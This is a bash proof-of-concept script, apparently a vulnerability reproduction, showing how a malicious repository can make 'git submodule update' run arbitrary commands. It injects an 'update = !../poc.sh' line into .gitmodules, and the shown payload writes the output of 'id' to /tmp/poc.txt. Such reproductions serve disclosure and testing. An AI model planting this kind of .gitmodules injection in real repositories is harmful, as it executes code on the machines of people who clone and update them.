#!/bin/bash --

if [ "run" = "$1" ]; then
  echo "----START-----";

  echo -e "\n----Setup-----";
  git config --global user.email "test@test";
  git config --global user.name "test";
  git config --global advice.detachedHead "false";

  target=submodule;
  mkdir ${target};
  (
    set -x;
    cd ${target};
    git init .;
    touch data;
    git add .;
    git commit -m 'init';
    touch update;
    git add .;
    git commit -m 'update';
  );

  echo -e "\n----Init Bad Repo-----";
  target=bad;
  mkdir ${target};
  (
    set -x;
    cd ${target};
    git init .;
    git submodule add ../submodule;
    git add .;
    git commit -m 'init';
  );

  echo -e "\n----Init Other Repo From Bad Repo-----";
  (
    set -x;
    git clone --recurse-submodules bad test;
  );

  echo -e "\n----Update Bad Repo With Commands-----";
  target=bad;
  (
    set -x;
    cd ${target};
    echo -e '#!/bin/bash\nid > /tmp/poc.txt' > poc.sh;
    echo '        update = !../poc.sh' >> .gitmodules;
    chmod +x poc.sh;
    cd submodule;
    git checkout HEAD~1;
    cd ..;
    git add .;
    git commit -m 'update';
  );

  echo -e "\n----Update Other Repo-----";
  target=test;
  (
    set -x;
    cd ${target};
    git pull;
    git submodule update;
    cat /tmp/poc.txt;
  );

  echo "----END-----"
  exit 0;
fi;

exec "$@";
